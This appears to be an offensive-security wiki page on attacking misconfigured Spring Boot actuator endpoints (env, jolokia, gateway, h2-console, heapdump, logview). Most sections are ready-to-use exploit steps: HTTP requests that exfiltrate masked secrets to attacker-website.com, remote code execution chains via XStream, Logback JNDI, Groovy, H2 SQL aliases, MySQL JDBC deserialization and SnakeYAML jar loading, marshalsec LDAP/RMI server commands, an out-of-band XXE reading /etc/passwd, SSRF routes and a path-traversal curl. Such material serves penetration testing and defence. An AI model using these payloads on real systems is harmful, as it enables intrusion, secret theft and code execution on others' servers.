# Spring Boot actuators overview

Spring Boot includes a number of additional features called [actuators](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html) to help monitor and control an application when it is pushed to production. Actuators allow controling and monitoring an application using either HTTP or JMX endpoints. Auditing, health and metrics gathering can also open a hidden door to the server if an application has been misconfigured.

Spring Boot includes a number of built-in [endpoints](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html#production-ready-endpoints) (or [endpoints](https://docs.spring.io/spring-boot/docs/1.5.x/reference/html/production-ready-endpoints.html) for Spring Boot 1.x) and lets developers add their own. For example, the `health` endpoint provides basic application health information.

Each individual endpoint can be enabled or disabled and exposed over HTTP or JMX. An endpoint is considered to be available when it is both enabled and exposed. The built-in endpoints will only be auto-configured when they are available. Most applications choose exposure via HTTP, where the ID of the endpoint along with a prefix of `/actuator` is mapped to a URL. For example, by default, the health endpoint is mapped to `/actuator/health`.

To learn more about the actuator's endpoints and their request and response formats check [Spring Boot Actuator Web API Documentation](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/).

# env

[env](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#env) exposes properties from Spring's `ConfigurableEnvironment`.

{% hint style="info" %}
Spring Boot 2.x uses `json` instead of `x-www-form-urlencoded` for property change requests via the `env` endpoint
{% endhint %}

{% hint style="info" %}
Information returned by the `env` and `configprops` endpoints can be somewhat sensitive so keys matching a certain pattern are [sanitized](https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/howto-actuator.html#howto-sanitize-sensible-values) (replaced by `*`) by default. However, below you can find several ways to retrieve these values
{% endhint %}

## eureka.client.serviceUrl.defaultZone

`eureka.client.serviceUrl.defaultZone` requires the following conditions:
- `/refresh` endpoint is available
- An application uses `spring-cloud-starter-netflix-eureka-client` dependency

### Retrieving env properties

You can get `env` property value in plaintext with the next steps:

1. Set the `eureka.client.serviceUrl.defaultZone` property:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    {
        "name": "eureka.client.serviceUrl.defaultZone",
        "value": "http://value:${your.property.name}@attacker-website.com/"
    }
    ```

2. Refresh the configuration

    ```http
    POST /actuator/refresh HTTP/1.1
    Content-Type: application/json
    ```

3. Retrive the property value from `Authorization` header from `attacker-website.com` logs

References:
- [Spring Boot Vulnerability Exploit Check List: Obtain the plaintext of the password desensitized by the asterisk (method 2)](https://github.com/LandGrey/SpringBootVulExploit#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C)

### XStream deserialization RCE

It requires `Eureka-Client` version `< 1.8.7`.

You can gain RCE with the following steps:

1. Set up a website that responds with a malicious XStream payload, check [springboot-xstream-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)
2. Set the `eureka.client.serviceUrl.defaultZone` property:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "eureka.client.serviceUrl.defaultZone",
        "value": "http://attacker-website.com/payload"
    }
    ```

3. Refresh the configuration:

    ```http
    POST /actuator/refresh HTTP/1.1
    Content-Type: application/json
    ```

4. Code will be executed

It is possible because:

1. The `eureka.client.serviceUrl.defaultZone` property is set to the external eureka server URL
2. Refresh triggers a request to the fake eureka server that will return a malicious payload
3. Response parsing triggers XStream deserialization that leads to code execution

References:
- [Spring Boot Vulnerability Exploit Check List: eureka xstream deserialization RCE](https://github.com/LandGrey/SpringBootVulExploit#0x03eureka-xstream-deserialization-rce)

## logging.config

`logging.config` requires `/restart` is available.

### Logback JDNI RCE

`logging.config` can lead to RCE via Logback JNDI, check [Logback JNDI RCE](#logback-jndi-rce). 

How to exploit:

1. Host `logback` config XML file with the following context:

    ```xml
    <configuration>
        <insertFromJNDI env-entry-name="ldap://attacker-website.com:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y" as="appName" />
    </configuration>
    ```

2. Host a malicious LDAP service, check the [article](https://landgrey.me/blog/21/) how to prepare a payload and start the service
3. Set `logging.config` properties:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "logging.config",
        "value": "http://attacker-website.com/logback.xml"
    }
    ```

4. Restart an application:

    ```http
    POST /actuator/restart HTTP/1.1
    Content-Type: application/json
    ```

Resource:
- [Spring Boot Vulnerability Exploit Check List: restart logging.config logback JNDI RCE](https://github.com/LandGrey/SpringBootVulExploit#0x09restart-loggingconfig-logback-jndi-rce)

### Groovy RCE

How to exploit:

1. Host the `payload.groovy` file with the following content:

    ```groovy
    Runtime.getRuntime().exec("open -a Calculator")
    ```

2. Set `logging.config`:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "logging.config",
        "value": "http://attacker-website.com/payload.groovy"
    }
    ```

3. Restart an application:

    ```http
    POST /actuator/restart HTTP/1.1
    Content-Type: application/json
    ```

The chain contains the following steps:

1. An attacker sets the Logback configuration file using the `logging.config` property
2. An application requests the configuration after restarting
3. `ch.qos.logback.classic.util.ContextInitializer.java` from `logback-classic` determines whether the URL `groovy` ends with
4. Groovy code from the configuration file is executed

References:
- [Spring Boot Vulnerability Exploit Check List: restart logging.config groovy RCE](https://github.com/LandGrey/SpringBootVulExploit#0x0arestart-loggingconfig-groovy-rce)

## spring.main.sources

`spring.main.sources` requires `/restart` is available.

How to exploit:

1. Host the `payload.groovy` file with the following content:

    ```groovy
    Runtime.getRuntime().exec("open -a Calculator")
    ```

2. Set `logging.config`:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.main.sources",
        "value": "http://attacker-website.com/payload.groovy"
    }
    ```

3. Restart an application:

    ```http
    POST /actuator/restart HTTP/1.1
    Content-Type: application/json
    ```

The chain contains the following steps:

1. Set `spring.main.sources` as an external URL with a payload
2. An application requests the URL after restarting
3. `org.springframework.boot.BeanDefinitionLoader.java` from `spring-boot` determines whether the URL `groovy` ends with
4. Groovy code from the configuration file is executed

References:
- [Spring Boot Vulnerability Exploit Check List: restart spring.main.sources groovy RCE](https://github.com/LandGrey/SpringBootVulExploit#0x0brestart-springmainsources-groovy-rce)

## spring.datasource.tomcat.validationQuery

`spring.datasource.tomcat.validationQuery` allows specifying any SQL query, that will be automatically executed against the current database. It could be any statement, including insert, update, or delete.

![](img/validation-query.png)

## spring.datasource.tomcat.url

`spring.datasource.tomcat.url` allows modifying the current JDBC connection string.

The problem here is that when the application establishing the connection to the database is already running, just updating the JDBC string has no effect. But you can try using `spring.datasource.tomcat.max-active` to increase the number of simultaneous database connections.

Thus, you can change the JDBC connection string, increase the number of connections, and then send many requests to the application to simulate a heavy load. Under load, the application will create a new database connection with an updated malicious JDBC string.

![](img/current-jdbc-connection.png)

## spring.datasource.data

`spring.datasource.data` can be used to gain RCE if the following coditions are met:

- `/restart` is available
- `h2database` and `spring-boot-starter-data-jpa` dependencies are used

How to exploit:

1. Host `payload.sql` file with the following content:

    ```sql
    CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('/bin/bash','-c','open -a Calculator');
    ```

    The `T5` method in the payload must be renamed (to `T6`) after the command is executed before it can be recreated and used. Otherwise, the vulnerability will not trigger the next time an application is restarted.

2. Set the `spring.datasource.data`:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.datasource.data",
        "value": "http://attacker-website.com/payload.sql"
    }
    ```

3. Restart an application:

    ```http
    POST /actuator/restart HTTP/1.1
    Content-Type: application/json
    ```

The exploitaion chain contains the following steps:

1. An attacker set `spring.datasource.data` as the URL of the JDBC DML SQL file
2. An application requests the URL after restarting
3. `org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java` from `spring-boot-autoconfigure` uses the `runScripts` method to execute the h2 database SQL code that leads to RCE

References:
- [Spring Boot Vulnerability Exploit Check List: restart spring.datasource.data h2 database RCE](https://github.com/LandGrey/SpringBootVulExploit#0x0crestart-springdatasourcedata-h2-database-rce)

## spring.datasource.url

`spring.datasource.url` is database connection string that is used only for the first connection. You can chain it with JDBC deserialization vulnerability in MySQL to gain RCE. The vulnerability requires the following conditions:

- `/refresh` is available
- `mysql-connector-java` dependency is used

{% hint style="info" %}
Changing `spring.datasource.url` will temporarily disable all normal database services
{% endhint %}

How to exploit:

1. Use the `/actuator/env` endpoint to fetch the next values:
    
    - `mysql-connector-java` version number (5.x or 8.x)
    - Common deserialization gadgets, such as `commons-collections`
    - `spring.datasource.url` value to facilitate later crafting of its normal JDBC URL

2. Create a payload with [ysoserial](https://github.com/frohoff/ysoserial):

    ```bash
    java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
    ```

3. Use [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) to host `payload.ser`
4. Set the `spring.datasource.url` property:

    `mysql-connector-java` version 5.x:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.datasource.url",
        "value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"
    }
    ```

    `mysql-connector-java` version 8.x:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.datasource.url",
        "value":"jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"
    }
    ```

5. Refresh the configuration:

    ```http
    POST /actuator/refresh HTTP/1.1
    Content-Type: application/json
    ```

6. Try to access an endpoint that will trigger a database query, for example `/product/list`, or find other ways to query the database and trigger the vulnerability

The exploitaion chain contains the following steps:
- `spring.datasource.url` is set to the external MySQL JDBC URL
- Refresh the configuration
- An application establishes a new DB connection using the malicious MySQL JDBS URL when performing a DB query
- The malicious MySQL server returns a payload at the appropriate stage of establishing the connection
- `mysql-connector-java` deserialize the payload and execute arbitrary code

References:
- [Spring Boot Vulnerability Exploit Check List: mysql jdbc deserialization RCE](https://github.com/LandGrey/SpringBootVulExploit#0x08mysql-jdbc-deserialization-rce)

## spring.cloud.bootstrap.location

`spring.cloud.bootstrap.location` requires the following conditions:

- `/refresh` endpoint is available
- `spring-cloud-starter` version `< 1.3.0.RELEASE`

### Retrieving env properties

You can get `env` property value in plaintext with the next steps:

1. Set the `spring.cloud.bootstrap.location` property:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.cloud.bootstrap.location",
        "value": "http://attacker-website.com/?=${your.property.name}"
    }
    ```

2. Refresh the configuration

    ```http
    POST /actuator/refresh HTTP/1.1
    Content-Type: application/json
    ```

3. Retrive the property value from `attacker-website.com` logs

References:
- [Spring Boot Vulnerability Exploit Check List: Obtain the plaintext of the password desensitized by the asterisk (method 3)](https://github.com/LandGrey/SpringBootVulExploit#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89)

### SnakeYML RCE

`spring.cloud.bootstrap.location` allows loading an external config in YAML format. You can gain code execution with the next steps:

1. Host `config.yml` at `http://attacker-website.com/config.yml` with the following content:

    ```yaml
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://attacker-website.com/payload.jar"]
      ]]
    ]
    ```

2. Host `payload.jar` with the code that will be executed, check [marshalsec research](https://github.com/mbechler/marshalsec) and [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) for how to prepare the payload
3. Set the `spring.cloud.bootstrap.location` property:

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json
    
    {
        "name": "spring.cloud.bootstrap.location",
        "value": "http://attacker-website.com/yaml-payload.yml"
    }
    ```

4. Refresh the configuration:

    ```http
    POST /actuator/refresh HTTP/1.1
    Content-Type: application/json
    ```

5. Code will be executed

It is possible because:

1. The `spring.cloud.bootstrap.location` is set to the URL with the external malicious config
2. Refresh triggers a request for the config file on a remote server and retrieves its content
3. `SnakeYAML` completes the specified action when parsing the malicious config due to a deserialization vulnerability
4. `SnakeYAML` uses `java.net.URL` to pull the malicious jar from the remote server
5. `SnakeYAML` searches for a class in the jar that implements the `javax.script.ScriptEngineFactory` interface and creates an instance of it
6. The instance creation leads to malicious code execution

References:
- [Spring Boot Vulnerability Exploit Check List: spring cloud SnakeYAML RCE](https://github.com/LandGrey/SpringBootVulExploit#0x02spring-cloud-snakeyaml-rce)
- [Spring Cloud Env Study Notes of Exploit Spring Boot Actuator](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/)

## spring.datasource.hikari.connection-test-query

`spring.datasource.hikari.connection-test-query` sets a query that will be executed before granting a connection from a pool. It can lead to RCE if the following conditions are met:

- `/restart` endpoint is available
- `com.h2database.h2` dependency is used

You can gain code execution with the following steps:

1. Set the `spring.datasource.hikari.connection-test-query` property

    ```http
    POST /actuator/env HTTP/1.1
    Content-Type: application/json

    {
        "name": "spring.datasource.hikari.connection-test-query",
        "value": "CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"
    }
    ```

    The `T5` method in the payload must be renamed (to `T6`) after the command is executed before it can be recreated and used. Otherwise, the vulnerability will not trigger the next time an application is restarted.

2. Restart the application:

    ```http
    POST /actuator/restart HTTP/1.1
    Content-Type: application/json
    ```

How it works:

- `spring.datasource.hikari.connection-test-query` is set to a malicious SQL statement that use CREATE ALIAS to create a custom function
- `spring.datasource.hikari.connection-test-query` correspondes to the `connectionTestQuery` configuration of the HikariCP database connection pool and define the SQL statement to be executed before a new database connection
- Restart establishes a new database connection
- The custom function is executed

References:
- [Spring Boot Vulnerability Exploit Check List: restart h2 database query RCE](https://github.com/LandGrey/SpringBootVulExploit#0x06restart-h2-database-query-rce)
- [Writeup: Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

# gateway

The [gateway](https://cloud.spring.io/spring-cloud-gateway/reference/html/#actuator-api) actuator endpoint lets you monitor and interact with a Spring Cloud Gateway application. In other words, you can define routes for the application and use `gateway` actuator to trigger requests according to these routes.

## SSRF

There are at least the following issues:
1. Routes can provide access to hidden or internal endpoints, which can be misconfigured or vulnerable. You can fetch all available routes via `GET`-request to `/actuator/gateway/routes`.
2. Full SSRF if [adding routes](https://cloud.spring.io/spring-cloud-gateway/reference/html/#creating-and-deleting-a-particular-route) do not require administrative permissions. The next request will create a route to localhost:

    ```http
    POST /actuator/gateway/routes/new_route HTTP/1.1
    Content-Type: application/json

    {
    "predicates": [
        {
        "name": "Path",
        "args": {
            "_genkey_0": "/new_route/**"
        }
        }
    ],
    "filters": [
        {
        "name": "RewritePath",
        "args": {
            "_genkey_0": "/new_route(?<path>.*)",
            "_genkey_1": "/${path}"
        }
        }
    ],
    "uri": "https://localhost",
    "order": 0
    }
    ```

    Send refresh request to apply new route:

    ```http
    POST /actuator/gateway/refresh HTTP/1.1
    Content-Type: application/json

    {
        "predicate": "Paths: [/new_route], match trailing slash: true",
        "route_id": "new_route",
        "filters": [
            "[[RewritePath /new_route(?<path>.*) = /${path}], order = 1]"
        ],
        "uri": "https://localhost",
        "order": 0
    }
    ```

References:
- [BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR](https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/)

## SpEL code injection

Applications using Spring Cloud Gateway in the version prior to `3.1.0` and `3.0.6`, are vulnerable to [CVE-2022-22947](https://tanzu.vmware.com/security/cve-2022-22947) that leads to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.

Check the following articles with details:
- [CVE-2022-22947: SPEL CASTING AND EVIL BEANS](https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/)
- [Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947)
- [Spring cloud gateway injects memory horses through SPEL](https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg)

# trace or httptrace

Displays HTTP trace information (by default, the last 100 HTTP request-response exchanges). It may disclose details about requests of internal applications as well as user cookies and JWT tokens.

`trace` requires an `HttpTraceRepository` bean.

# mappings

[mappings](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#mappings) displays a collated list of all `@RequestMapping` paths.

# sessions

[sessions](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#sessions) allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a Servlet-based web application using Spring Session.

# shutdown

[shutdown](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#shutdown) lets an application be gracefully shutdown. Disabled by default.

# h2-console

It requires the following conditions:

- `com.h2database.h2` dependency is used
- h2 console is enabled in Spring configuration `spring.h2.console.enabled=true`

You can gain RCE via JDNI in h2 database console:

1. Access the h2 console `/h2-console`. An application will refirect to `/h2-console/login.jsp?jsessionid=xxxxxx`. Catch `jsessionid` value.
2. Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)
3. Compile in such a way that it is compatible with earlier JDK versions:

    ```bash
    javac -source 1.5 -target 1.5 JNDIObject.java
    ```

4. Host compiled `JNDIObject.class` at `http://attacker-website.com/`
5. Set up a LDAP service with [marshalsec](https://github.com/mbechler/marshalsec):

    ```bash
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker-website.com:80/#JNDIObject 1389
    ```

6. Trigger JNDI injection:

    ```http
    POST /h2-console/login.do?jsessionid=xxxxxx
    Host: vulnerable-website.com
    Content-Type: application/json
    Referer: http://vulnerable-website.com/h2-console/login.jsp?jsessionid=xxxxxx

    {
        "language": "en",
        "setting": "Generic+H2+(Embedded)",
        "name": "Generic+H2+(Embedded)",
        "driver": "javax.naming.InitialContext",
        "url": "ldap://attacker-website.com:1389/JNDIObject",
        "user": "",
        "password": ""
    }
    ```

References:
- [Spring Boot Vulnerability Exploit Check List: h2 database console JNDI RCE](https://github.com/LandGrey/SpringBootVulExploit#0x07h2-database-console-jndi-rce)

# heapdump

[heapdump](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#heapdump) returns a hprof heap dump file that may contain sensitive data, such as `env` properties. To retrieve data from a prof heap dump use [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) tool, check [Find password plaintext in spring heapdump using MAT](https://landgrey.me/blog/16/).

References:
- [Spring Boot Vulnerability Exploit Check List: Obtain the plaintext of the password desensitized by the asterisk (method 4)](https://github.com/LandGrey/SpringBootVulExploit#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B)

# jolokia

Exposes JMX beans over HTTP (when Jolokia is on the classpath, not available for WebFlux). Requires a dependency on `jolokia-core`.

## Extract env properties

You can invoke relevant MBeans to retrive `env` property values in plaintext. Below you can find MBeans that can be used for this purpose. However, the situation may differ and the Mbeans listed may not be available. However, you can search methods that can be called by keywords like `getProperty`.

References:
- [Spring Boot Vulnerability Exploit Check List: Obtain the plaintext of the password desensitized by the asterisk (method 1)](https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80)

### org.springframework.boot

You can get `env` property value in plaintext using the following request:

```http
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
    "mbean": "org.springframework.boot:name=SpringApplication,type=Admin",
    "operation": "getProperty",
    "type": "EXEC",
    "arguments": [
        "your.property.name"
    ]
}
```

`org.springframework.boot` MBean calls the `getProperty` method of the `org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar` class instance.

### org.springframework.cloud.context.environment

You can get `env` property value in plaintext using the following request:

```http
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
    "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
    "operation": "getProperty",
    "type": "EXEC",
    "arguments": [
        "your.property.name"
    ]
}
```

`org.springframework.cloud.context.environment` MBean calls the `getProperty` method of the `org.springframework.cloud.context.environment.EnvironmentManager` class instance.

## Logback::reloadByURL

You can list all available MBeans actions using the `/jolokia/list` endpoint. Most MBeans actions just expose some system data, but if the `reloadByURL` action provided by the `Logback` library exists:

![](img/jolokia-list.png)

the logging configuration can be reload from an external URL:

```http
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
```

### Out-Of-Band XXE

`Logback` uses XML configuration parsed by the `SAXParser` XML parser with external entities enabled. You can exploit this feature to trigger an Out-Of-Band XXE:

```xml
<!-- logback.xml -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker-website.com/file.dtd">%remote;%int;]>
<a>&trick;</a>
```

```xml
<!-- file.dtd -->
<!ENTITY % d SYSTEM "file:///etc/passwd"> 
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

![Server response with error and contents of `/etc/passwd` file](img/oob-xxe.png)

References:
- [Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)

### Logback JNDI RCE

The `Logback` configuration has the feature [Obtaining variables from JNDI](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). In the XML configuration file you can include a tag like:

```xml
<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName"/>
```

In this case, the `env-entry-name` attribute will be passed to the `DirContext.lookup()` method. Providing an arbitrary name to the `lookup` method can lead to remote code execution via remote class loading.

You can gain code execution with the following steps:

1. Get the `/jolokia/list` to check if `ch.qos.logback.classic.jmx.JMXConfigurator` class and `reloadByURL` method are available
2. Host the logback configuration at `http://attacker-website.com/logback.xml`:

    ```xml
    <configuration>
        <insertFromJNDI env-entry-name="ldap://attacker-website.com:1389/JNDIObject" as="appName" />
    </configuration>
    ```
3. Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)
4. Compile in such a way that it is compatible with earlier JDK versions:

    ```bash
    javac -source 1.5 -target 1.5 JNDIObject.java
    ```

5. Host the compiled `JNDIObject.class` at `http://attacker-website.com/`
6. Set up LDAP server, use [marshalsec](https://github.com/mbechler/marshalsec) to set up the server:

    ```bash
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker-website.com:80/#JNDIObject 1389
    ```

7. Load the log configuration from an external URL with the following request:

    ```
    GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml HTTP/1.1
    ```
    
    If an application successfully requests `logback.xml` and `marshalsec` receives the target request, but an application does not request `JNDIObject.class`, it is likely that an application's JDK version is too high, causing JNDI usage to fail.

It is possible due to the following steps:

1. Direct access to the URL that could cause the vulnerability is equivalent to calling the `ch.qos.logback.classic.jmx.JMXConfigurator` class method via jolokia `reloadByURL`
2. An application requests a XML configuration file from an external URL
3. XML configuration is parsed by `saxParser.parse`, it leads to XXE vulnerability
4. The external JNDI server address is specified using the `insertFormJNDI` tag in the Logback XML configuration file
5. An application requests a malicious JNDI server, it leads to JNDI injection and RCE

References:
- [Spring Boot Vulnerability Exploit Check List: jolokia logback JNDI RCE](https://github.com/LandGrey/SpringBootVulExploit#0x04jolokia-logback-jndi-rce)
- [Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
- [Research: A Journey From JNDI/LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
- [Research: Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

## Tomcat::createJNDIRealm

One of the MBeans of Tomcat (embedded into Spring Boot) is `createJNDIRealm`. `createJNDIRealm` allows creating JNDIRealm that is vulnerable to JNDI injection. You can expoit with the next steps:

1. Get the `/jolokia/list` to check if `type=MBeanFactoryand` and `createJNDIRealm` are in place
2. Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)
3. Compile the code and host the compiled class at `http://attacker-website.com/`
4. Set up a RMI service with [marshalsec](https://github.com/mbechler/marshalsec):

    ```bash
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://attacker-website.com:80/#JNDIObject 1389
    ```

5. Send the payload using [springboot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py)

It is possible due to the following chain:

1. Create `JNDIRealm` with `createJNDIRealm`
2. Set the `connectionURL` address to RMI Service URL
3. Set `contextFactory` to `RegistryContextFactory`
4. Stop Realm
5. Start Realm to trigger JNDI injection of specified RMI address, causing RCE

References:
- [Spring Boot Vulnerability Exploit Check List: jolokia-realm-jndi-rce](https://github.com/LandGrey/SpringBootVulExploit#0x05jolokia-realm-jndi-rce)
- [Yet Another Way to Exploit Spring Boot Actuators via Jolokia](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html)

## Jookia CVEs

- [How I made more than $30K with Jolokia CVEs](https://blog.it-securityguard.com/how-i-made-more-than-30k-with-jolokia-cves/)
- [Jolokia Vulnerabilities - RCE & XSS](https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html)

# logfile

[logfile](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#log-file) returns the contents of the logfile (if `logging.file.name` or `logging.file.path` properties have been set). Supports the use of the HTTP Range header to retrieve part of the log file's content.

# logview

[spring-boot-actuator-logview](https://github.com/lukashinsch/spring-boot-actuator-logview) version before `0.2.13` is vulnerable to path traversal that allows you to retreive arbitrary files.

```bash
# retreaving /etc/passwd
$ curl http://localhost:8887/manage/log/view?filename=/etc/passwd&base=../../../../../
```

References:
- [Writeup: CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal](https://pyn3rd.github.io/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/)

# dump or threaddump

[dump or threaddump](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#threaddump) performs a thread dump from the application's JVM.

# References

- [Spring Boot Actuator: Production-ready Features](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [Veracode Research: Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Spring Boot Vulnerability (Keep On Updating)](https://github.com/pyn3rd/Spring-Boot-Vulnerability)
